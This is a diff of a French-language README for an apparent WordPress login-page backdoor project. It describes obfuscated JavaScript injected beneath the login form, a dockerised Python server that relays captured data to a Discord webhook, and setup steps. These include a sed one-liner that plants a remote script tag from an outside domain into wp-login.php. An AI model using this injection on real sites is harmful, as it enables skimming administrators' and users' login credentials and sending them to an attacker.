@@ -9,7 +9,7 @@ Projet de backdoor simple de page de login wordpress:
 
 Contient :
 
-- La backdoor javascript `wp-login_backdoor.js` et la backdoor obfusquée `wp-custom-util.js` à insérer sur la page wordpress en dessous du form `<form name="loginform" id="loginform"` comme : `<script src="https://domain/wp-custom-util.js"></script>`
+- La backdoor javascript `wp-login_backdoor.js` et la backdoor obfusquée `wp-custom-util.js`
 - Le serveur python dockerisé pour envoyer les notifications discord
 
 ## 🚀 Quick Start
@@ -24,13 +24,17 @@ Contient :
 #### 1. Clone the repository
 
 ```bash
-git clone https://github.com/votre-username/python-backdoor-lab.git
-cd python-backdoor-lab
+git clone https://github.com/0xNemo/WP-Login-Backdoor.git
+cd WP-Login-Backdoor
 ```
 
 #### 2. Configure environment
 
 Éditez le fichier .env ou modifiez les variables dans le docker-compose.yml pour ajouter votre webhook Discord
+
+| Variable  | Description | Default |
+| ------------- | ------------- | ------------- |
+| WEBHOOK_HOST | Webhook du serveur discord | None |
 
 #### 3. Build & Run
 
@@ -38,13 +42,14 @@ cd python-backdoor-lab
 docker-compose up -d --build
 ```
 
-## ⚙️ Configuration
+## ⚙️ Setup 
 
-| Variable  | Description | Default |
-| ------------- | ------------- | ------------- |
-| WEBHOOK_HOST | Webhook du serveur discord | None |
+- Changez `var server =` dans les fichiers javascript avec votre serveur python, route `/data` 
+- Insérer la backdoor `<script src="https://domain/wp-custom-util.js"></script>` après le form `<form name="loginform" id="loginform"` dans `wp-login.php`
 
-## Example
+_Example commande_ : `sed -i '/name="loginform"/,/<\/form>/ s/<\/form>/<\/form>\n<script\ src="https:\/\/domain\/wp-custom-util.js"><\/script>/' wp-login.php`
+
+## Démo
 <img width="511.2" height="283.2" alt="2026-02-20_16-03" src="https://github.com/user-attachments/assets/533cb868-0996-4104-af8a-0aacc53aa88b" />
 <img width="511.2" height="341.69" alt="2026-02-20_16-04" src="https://github.com/user-attachments/assets/d9b52477-0fb9-49fd-936e-168358faf2cd" />
 
